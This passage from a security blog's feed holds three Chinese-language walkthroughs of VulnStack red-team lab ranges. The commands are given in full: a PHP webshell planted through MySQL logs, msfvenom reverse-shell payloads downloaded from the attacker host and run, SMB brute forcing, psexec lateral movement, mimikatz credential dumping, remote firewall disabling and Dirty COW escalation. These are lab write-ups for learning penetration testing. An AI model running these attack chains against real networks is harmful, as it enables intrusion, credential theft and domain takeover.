plaintext"><table><tr><td class="code"><pre><span class="line">use joomla;// 选择库</span><br><span class="line">show tables;// 根据我们的到的信息, 应该找 am2zu_ 开头的</span><br><span class="line">select * from am2zu_users;// 找到了超级管理员账号和加密过的密码</span><br><span class="line">select * from umnbt_users;// 我比较好奇</span><br><span class="line">update am2zu_users set password = md5(&quot;123456&quot;) where id =891;</span><br></pre></td></tr></table></figure><blockquote><p>如果你不放心可以找官方给出的加密的的值, 为admin加密得到的</p><p>433903e0a9d6a712e00251e44d29bf87:UJ0b9J5fufL3FKfCc0TLsYJBh2PFULvT</p></blockquote><p>上面是我们要找的,下面是我感兴趣的</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504175906638.png" alt="image-20240504175906638"></p><p>然后用<code>Administrator/123456</code>登录网站后台即可, 尝试写马或者上传</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504180110194.png" alt="image-20240504180110194"></p><p>选择<code>Beez3 Details and Files</code>,然后<code>new file</code>,记得顶上的 Save &amp; Close也是非常好心地给了木马路径, 访问如果出现phpinfo的信息就表示成功解析了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.204.131/templates/beez3/shell.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504180513630.png" alt="image-20240504180513630"></p><p>蚁剑连接即可,然后发现命令无法执行,可以直接用蚁剑的<code>绕过disable_function</code>插件.我选择的是<code>PHP7_UserFilter</code>,直接在终端内操作即可</p><p>也可以用SSH登录,我会写在后面</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504180948500.png" alt="image-20240504180948500"></p><h2 id="内网渗透"><a class="header-anchor" href="#内网渗透">¶</a>内网渗透</h2><h3 id="初步信息收集"><a class="header-anchor" href="#初步信息收集">¶</a>初步信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip addr// 内网地址192.168.93.120  ???</span><br></pre></td></tr></table></figure><p>诶你先别急, 假如你也做了ssh登录网站主机,你会发现蚁剑上的似乎有很大不同, 蚁剑连接上的只有一个网卡,不可能是我们ssh连接上的这个机器,所以先收集一下内网信息</p><blockquote><p>为什么我们webshell拿到的是内网的呢，原因是做了一层nginx反向代理</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname // 获取主机名 ubuntu</span><br><span class="line">w// 查看目前登录的用户 yy</span><br><span class="line">netstat -anplt// 打印本地端口开放信息</span><br><span class="line">whoami// www-data</span><br></pre></td></tr></table></figure><p>再来上线msf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.204.132 lport=10000 -f elf &gt; msf.elf</span><br><span class="line">// 生成木马</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.204.132</span><br><span class="line">set lport 10000</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>这里就不能用蚁剑了,因为连接的机器在内网,肯定是出不来的, 这里给出ssh的方法(<strong>不需要提权</strong>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8080// 这是kali,开启http服务,注意要在木马目录下</span><br><span class="line">wget http://192.168.204.132:8080/msf.elf// 这是连上的靶机,通过http下载木马</span><br><span class="line">chmod 777 msf.elf// 靶机给予权限</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504202019354.png" alt="image-20240504202019354"></p><p>运行即可监听,运行命令为<code>./msf.elf</code>, 如果你已经利用ssh提权了,连接就是firefart的root权限如果想要在后台运行<code>./msf.elf &amp;</code>或者<code>nohup ./msf.elf &gt; /dev/null 2&gt;&amp;1 &amp;</code>都可以,前者不能关会话</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504202310933.png" alt="image-20240504202310933"></p><p>查看网卡信息, 因为是linux系统,还是用msf继续进行收集吧</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504212611130.png" alt="image-20240504212611130"></p><p>msf添加内网网段路由</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.93.0/24// 直接在meterpreter中执行</span><br><span class="line">route add 192.168.93.0 255.255.255.0 1// 似乎也行, 在模块选择中执行</span><br></pre></td></tr></table></figure><p>msf添加socks代理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set version 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>msf模块扫描存活主机, 我没找到 linux 的 fscan</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// msf</span><br><span class="line">use auxiliary/scanner/smb/smb_version// 针对windows</span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep// 针对linux</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.93.0/24</span><br><span class="line">set threads 10// 这是并发, 越快越好</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>可以得到 windows 存活主机<code>192.168.93.10</code>, <code>192.168.93.20</code>, <code>192.168.93.30</code>, 再加上蚁剑爆出来的<code>192.168.93.120</code>, 本身是<code>192.168.93.100</code>, 一共五台主机</p><h3 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h3><p>先用nmap扫一圈再说, 都开着445端口,但是永恒之蓝漏洞一点用都没有</p><p>试一下smb登录爆破吧(其实就是想要psexec登录域控)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set user_file user.txt</span><br><span class="line">set pass_file pass.txt</span><br><span class="line">set rhosts 192.168.93.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>这里用的自己的字典,给个<a href="https://github.com/k8gege/PasswordDic/">参考</a>吧</p><p>爆破出来<code>192.168.93.30</code>和<code>192.168.93.20</code>的密码都是<code>administrator/123qwe!ASD</code>,然后利用msf的模块登录<code>192.168.93.30</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.93.30</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 123qwe!ASD</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504230254966.png" alt="image-20240504230254966"></p><h3 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h3><p>终于来到了最熟悉的windows,进行一个信息收集</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami          // nt authority\system</span><br><span class="line">ipconfig /all// 域 test.org, 内网地址 192.168.93.30</span><br><span class="line">net user /domain// 无回显</span><br><span class="line">net user// Administrator, Guest</span><br><span class="line">net config workstation // 计算机详细信息, 无回显?</span><br></pre></td></tr></table></figure><p>ping取得域控ip: <code>192.168.93.10</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504230736219.png" alt="image-20240504230736219"></p><p>抓取密码, 不知道为什么我抓不到,返回都是空的,20和30都是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi// 加载</span><br><span class="line">creds_all</span><br><span class="line">creds_kerberos</span><br></pre></td></tr></table></figure><blockquote><p>原因是这个: [!] Loaded x86 Kiwi on an x64 architecture.</p><p>这个时候用进程迁移是个不错的选择, 我将其放在后面</p></blockquote><p>没办法,只能直接上传mimikatz了, 这里30不知道发什么疯,不能登录,换成了20</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// smb连接</span><br><span class="line">proxychains smbclient //192.168.93.20/C$ -U administrator// 123qwe!ASD</span><br><span class="line">put mimikatz.exe// 在C盘根目录下</span><br><span class="line"></span><br><span class="line">// msf的shell执行</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.log// 抓</span><br><span class="line">type log.log// 直接查看</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505094005010.png" alt="image-20240505094005010"></p><p>密码大满贯,结合剩下给出的信息可以知道两个有效密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator  zxcASDqw123!!</span><br><span class="line">Administrator  123qwe!ASD</span><br></pre></td></tr></table></figure><h3 id="攻击域控"><a class="header-anchor" href="#攻击域控">¶</a>攻击域控</h3><p>尝试用psexec登录域控, 先利用ipc$连接然后关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off// 自己的也关了</span><br><span class="line">netsh advfirewall show allprofiles// 查看防火墙状态</span><br><span class="line"></span><br><span class="line">net use \\192.168.93.10\ipc$ &quot;zxcASDqw123!!&quot; /user:&quot;administrator&quot;</span><br><span class="line">// 让其与域控建立 ipc$ 连接</span><br><span class="line">sc \\192.168.93.10 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">// 创建关闭防火墙的服务</span><br><span class="line">sc \\192.168.93.10 start unablefirewall</span><br><span class="line">// 立即启动服务</span><br></pre></td></tr></table></figure><p>说是没成功实际上已经成功了,在域控机子的cmd上执行查看防火墙命令即可确认</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505100210082.png" alt="image-20240505100210082"></p><p>配置psexec, 拿下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.93.10</span><br><span class="line">set smbdomain test.org</span><br><span class="line">set smbuser Administrator</span><br><span class="line">set smbpass zxcASDqw123!!</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505103712450.png" alt="image-20240505103712450"></p><p>其实也可以直接利用ipc$读文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ipc$连接后执行net use的时候会发现多了一个\\ip\ipc$的用户, 远程命令如下:</span><br><span class="line">dir \\192.168.93.10\c$\// 即命令+ip+目录</span><br></pre></td></tr></table></figure><p>重要文档一般都是在用户文件夹下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.93.10\c$\users// 探探路</span><br><span class="line">dir \\192.168.93.10\c$\users\*flag* /s /b// 搜索</span><br><span class="line">type \\192.168.93.10\c$\users\administrator\Documents\flag.txt// 读取</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505102835702.png" alt="image-20240505102835702"></p><h1>SSH登录网站主机</h1><h2 id="登录"><a class="header-anchor" href="#登录">¶</a>登录</h2><p>蚁剑连接后在<code>/tmp/mysql/test.txt</code>找到了一组账号密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser wwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure><p>这个显然不是mysql的,我们已经翻过表了,尝试过一些地方登录后发现是可以登陆ssh的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh wwwuser@192.168.204.131</span><br></pre></td></tr></table></figure><blockquote><p>我这里kali报错: 发现远程服务器提供的主机密钥类型与客户端能接受的密钥类型不匹配,所以用的是服务器管理工具,或者修改命令即可,我不是很推荐</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh wwwuser@192.168.204.131 -oHostkeyAlgorithms=+ssh-dss</span><br></pre></td></tr></table></figure></blockquote><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>查看可写文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable -<span class="built_in">type</span> f -not -path <span class="string">&quot;/proc/*&quot;</span> -not -path <span class="string">&quot;/sys/*&quot;</span> -not -path <span class="string">&quot;/var/*&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504185503158.png" alt="image-20240504185503158"></p><p>passwd.bak感觉眼熟? 这就是脏牛漏洞! 这个影响的内核版本从Linux-2.6.22到Linux4.8</p><blockquote><p>脏牛漏洞poc(dirt cow): <a href="https://github.com/gbonacini/CVE-2016-5195">下载地址1(cpp)</a>  <a href="https://github.com/firefart/dirtycow">下载地址2©</a></p><p>后缀不同命令也不同,这里选择的是c版本的</p></blockquote><p>先查看内核版本看看,确实很老,刚好能用</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504191256645.png" alt="image-20240504191256645"></p><p>无论你是通过 kali 开 http 服务还是通过管理工具, 上传了脏牛poc即可(要求有 gcc 环境, 用 gcc -v 可以查看)</p><p>编译并且运行,稍微等一下,得到账号密码<code>firefart/123456</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504193655832.png" alt="image-20240504193655832"></p><p>然后就可以切换用户了,应该挺容易看出权限</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504194106242.png" alt="image-20240504194106242"></p><h1>进程迁移抓取密码</h1><p>帮你们尝试过了,抓<code>192.168.93.20</code>的, <strong>30的什么都没有</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysinfo// 查看当前meterpreter信息</span><br><span class="line">ps// 寻找x64的进程</span><br><span class="line">migrate 2076// 迁移Metasploit会话到另一个进程(PID)</span><br></pre></td></tr></table></figure><p>总算是可以运行了(来自后期的欣慰)</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505093046059.png" alt="image-20240505093046059"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> Kali </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack-红日2</title>
      <link href="/article/vulnstack-2/"/>
      <url>/article/vulnstack-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>well done也有全熟的意思</p></blockquote><h1>vulnstack红队2</h1><p><strong>拍快照,拍快照,拍快照!</strong>不然你做不出来想要remake都做不到</p><p>新增两个虚拟网络:192.168.111.0/24 外网环境(Vmnet1)10.10.10.0/24 内网环境(Vmnet2)</p><blockquote><p>靶机初始密码均为<code>1qaz@WSX</code></p><p>管理员账号密码为<code>Administrator/1qaz@WSX</code></p><p>当win7可以ping通所有ip地址, 环境就配置完成了</p></blockquote><ul><li><p>kali</p><p>192.168.111.128</p></li><li><p><a href="http://PC.de1ay.com">PC.de1ay.com</a></p><p>用<code>DE1AY\mssql/1qaz@WSX</code>登录</p><p>192.168.111.201</p><p>10.10.10.201</p></li><li><p><a href="http://DC.de1ay.com">DC.de1ay.com</a></p><p>用<code>DE1AY\de1ay/1qaz@WSX</code>登录</p><p>10.10.10.10</p></li><li><p><a href="http://WEB.de1ay.com">WEB.de1ay.com</a></p><p>这里因为域不同所以需要切换用户用<code>de1ay/1qaz@WSX</code>登录192.168.111.8010.10.10.80</p></li></ul><p>右键以管理员身份运行<code>C:\Oracle\Middleware\user_projects\domains\base_domain</code>下的bat文件, 然后访问<code>ip:7001/console</code>让其自动部署即可启动好环境,刷新一下就能到后台登录界面,问就是没有其他网页</p><p>这个360让我先试试水,在PC.de1ay.com上也有360,都打开</p><blockquote><p>好像开了360就不能被ping通了,现在pc和web相互无法ping通</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503082902329.png" alt="image-20240503082902329"></p><h2 id="外网渗透"><a class="header-anchor" href="#外网渗透">¶</a>外网渗透</h2><h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.111.0/24// 主机发现</span><br><span class="line">nmap -sS 192.168.111.80// 半开放扫描扫描目标端口</span><br><span class="line">nmap -sS -Pn 192.168.111.80// 也可以用绕过防火墙的参数</span><br></pre></td></tr></table></figure><p>可以看到两台主机: 201和80, 201扫描之后没有什么东西(都开了远程桌面和445端口?)</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503102344954.png" alt="image-20240503102344954"></p><p>7001: weblogic有着对应的扫描器, <a href="https://github.com/rabbitmask/WeblogicScan">下载地址</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 WeblogicScan.py -u 192.168.111.80 -p 7001</span><br></pre></td></tr></table></figure><p>有两个漏洞,我们用最新的看能不能不触发360的防护</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503110448745.png" alt="image-20240503110448745"></p><h3 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h3><p>启动msf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search cve-2019-2725</span><br><span class="line">use 0</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set target 1</span><br><span class="line">set lport 10000</span><br><span class="line">set rhosts 192.168.111.80</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503151954640.png" alt="image-20240503151954640"></p><p>由于360的存在,提权不太可能如此顺利,先进入shell进行信息收集</p><h2 id="内网渗透"><a class="header-anchor" href="#内网渗透">¶</a>内网渗透</h2><h3 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami          // de1ay\administrator</span><br><span class="line">ipconfig /all// 域de1ay.com, 内网地址10.10.10.80, 外网地址192.168.111.80</span><br><span class="line">net user /domain// 无回显</span><br><span class="line">net user// Administrator, de1ay, Guest</span><br><span class="line">net config workstation // 计算机详细信息</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503155126019.png" alt="image-20240503155126019"></p><p>利用ping寻找域控, <code>10.10.10.10</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503163035435.png" alt="image-20240503163035435"></p><h3 id="msf和cs联动"><a class="header-anchor" href="#msf和cs联动">¶</a>msf和cs联动</h3><p><strong>msf-&gt;cs</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./teamserver 192.168.111.128 123456// 启动js</span><br></pre></td></tr></table></figure><p>设置监听器如下, HTTP地址和端口随意设置, 要求和前面不能占用同一个端口</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503153330777.png" alt="image-20240503153330777"></p><p>在msf中执行如下, 成功的话就可以看见一个新的会话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 1234</span><br><span class="line">set session 1// 此处session是漏洞利用后连上win7的会话</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>会话交互,先输入<code>sleep 1</code>后立刻输入<code>shell whoami</code>等待回显, 有回显证明会话有效</p><p>可以直接提权:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503162727794.png" alt="image-20240503162727794"></p><p>利用<code>mimikatz</code>抓密码,然后就可以在<strong>密码凭据</strong>界面看到抓到的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logonpasswords// 抓明文</span><br><span class="line">hashdump// 抓hash</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503163658011.png" alt="image-20240503163658011"></p><p>尝试关闭防火墙, 成功, 但是似乎执行<code>net view</code>还是不可用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h3 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h3><p>和红队1相同,先创建smb监听器, 我直接就叫smb</p><p>我的是中文版,是右键会话选择<code>新建会话(S)</code>就可以绑定smb监听器,还是交互输入<code>spawn smb</code>好</p><p>我现在右键的这个是执行命令后多出来的&quot;跳板&quot;</p><blockquote><p>SMB Beacon使用windows管道进行通信,可以把以此为枢纽,进行内外网的流量转发</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503164211635.png" alt="image-20240503164211635"></p><p>我这里攻击列表并没有出现域控或是其他主机, 我只能根据之前的信息进行手动添加</p><p><code>视图(V)--&gt;目标列表(T)--&gt;下方的添加</code>, ip就直接是域控就好了<code>10.10.10.10</code></p><p>先进行端口扫描,发现开放的端口中有135,139,445,尝试<code>psexec</code>登录域控, smb是之前新建的监听器</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173030495.png" alt="image-20240503173030495"></p><p>登录成功,我们取得了DC的控制权,而且权限为system</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173308230.png" alt="image-20240503173308230"></p><p>对于另一个域成员只需要故技重施即可,虽然只知道外网地址,但是可以通过输入<code>arp -a</code>来看还有哪些主机,我这里在域控上输入:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240503173628952.png" alt="image-20240503173628952"></p><p>轻易得到另一台主机是<code>10.10.10.201</code>,其他不再赘述</p><blockquote><p>此外可以做的拓展: ms14-068的域内提权</p><p>诶话说回来, 360似乎没有啥截拦啊</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> Kali </tag>
            
            <tag> 内网 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack-红日1</title>
      <link href="/article/vulnstack-1/"/>
      <url>/article/vulnstack-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>写在前面: 本题使用了Cobalt Strike和fscan,并不是kali带有的工具,请自行下载</p></blockquote><h1>vulnstack红队1</h1><p><strong>拍快照,拍快照,拍快照!</strong>不然你做不出来想要remake都做不到</p><p>新增两个虚拟网络:192.168.52.0/24 内网环境(Vmnet1)192.168.72.0/24 外网环境(Vmnet2)</p><blockquote><p>靶机初始密码均为<code>hongrisec@2019</code></p><p>当win7可以ping通所有ip地址, 环境就配置完成了</p></blockquote><ul><li><p>kali</p><p>192.168.72.128</p></li><li><p>Windows7 x64  密码更换为<code>hongrisec@2024</code>, 记得开启php192.168.72.129192.168.52.143</p></li><li><p>Windows Server 2008 R2 x64  密码更换为<code>hongrisec@2024</code>192.168.52.138</p></li><li><p>Win2K3 Metasploitable 配置如下图192.168.52.130</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502175114484.png" alt="image-20240502175114484"></p><p>虽然因为配置是可以直接攻击域控的,但是题目本来是不行的,所以还是根据给的图来进行攻击</p><blockquote><p>可惜最后还是直接上域控了</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240502102611922.png" alt="image-20240502102611922"></p><h2 id="外网渗透"><a class="header-anchor" href="#外网渗透">¶</a>外网渗透</h2><h3 id="主机发现"><a class="header-anchor" href="#主机发现">¶</a>主机发现</h3><p>进行nmap扫描后可以得到自己的主机和在外网的主机<code>192.168.72.129</code>同时可以得到目标开放了80和3306端口, 先访问看看吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.72.0/24</span><br><span class="line">// 当然还有什么 nmap -sU -p137 192.168.72.0/24 -T4 等</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3><p>用浏览器访问目标网页,发现是一个phpStudy探针, 里面有大量敏感信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绝对路径 C:/phpStudy/WWW</span><br><span class="line">Apache/2.4.23,  PHP/5.4.45</span><br><span class="line">可以直接执行 phpinfo();</span><br><span class="line">MySQL数据库,  SQLite/3.8.10.2</span><br></pre></td></tr></table></figure><h3 id="目录扫描"><a class="header-anchor" href="#目录扫描">¶</a>目录扫描</h3><p>利用<code>dirsearch</code>进行扫描, 可以得到<code>phpMyadmin</code>的目录信息尝试登录, 发现是弱密码, 账号密码都为root</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428183649795.png" alt="222"></p><p>更换字典可以扫描到备份文件 (此处shell是因为已通过phpMyadmin进行getshell)</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428184343918.png" alt="image-20240428184343918"></p><h3 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h3><ul><li>phpMyadmin</li></ul><p>查询<code>secure_file_priv</code>属性, 发现为NULL, 采用日志写马</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;<span class="operator">/</span><span class="operator">/</span> 查询日志状态</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>; <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span>;<span class="operator">/</span><span class="operator">/</span> 开启日志读写</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>然后用蚁剑连接就行,路径在网站根目录</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428182359427.png" alt="image-20240428182359427"></p><ul><li>yxcms</li></ul><p>通过查看下载下来的备份文件可以知道这似乎是yxcms网站</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428184744713.png" alt="image-20240428184744713"></p><p>可以访问<code>192.168.72.129/yxcms/</code>来查看首页,右侧公告信息给出了敏感信息</p><blockquote><p>后台地址: /index.php?r=admin</p><p>用户名: admin</p><p>密码: 123456</p></blockquote><p>登录后发现可以更改模板php文件,写马即可修改<code>index_index.php</code>,直接在最上方加上一句话木马即可,随后蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428190410498.png" alt="image-20240428190410498"></p><p>不管什么方法,getshell后利用msf进行下一步: 上传反弹shell (随意放,放启动项是习惯)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/</span><br></pre></td></tr></table></figure><p>然后用msf进行监听, 蚁剑运行上传的反弹木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 生成</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.128 lport=10000  -f exe -o win2.exe</span><br><span class="line">// 监听</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.72.128</span><br><span class="line">set lport 10000</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>连接后进入<code>shell</code>进行内网信息收集</p><h3 id="内网信息收集"><a class="header-anchor" href="#内网信息收集">¶</a>内网信息收集</h3><ul><li>域信息收集</li></ul><p>乱码使用<code>chcp 65001</code>解决</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami// 当前权限  god\administrator</span><br><span class="line">ipconfig /all// 查看网络信息  双网卡</span><br><span class="line">net user /domain// 查看域用户 Administrator,Guest,krbtgt,ligang,liukaifeng01</span><br><span class="line">net config workstation// 查看工作站配置信息</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428203341439.png" alt="image-20240428203341439"></p><p>可以看到我们处于<code>GOD</code>域内</p><p>查看arp缓存, 可以看到可能存活的主机</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428204155230.png" alt="image-20240428204155230"></p><p>通过ping域DNS名称来查找域控主机,得到域控<code>192.168.52.138</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240428203752147.png" alt="image-20240428203752147"></p><p>关闭win7防火墙</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state 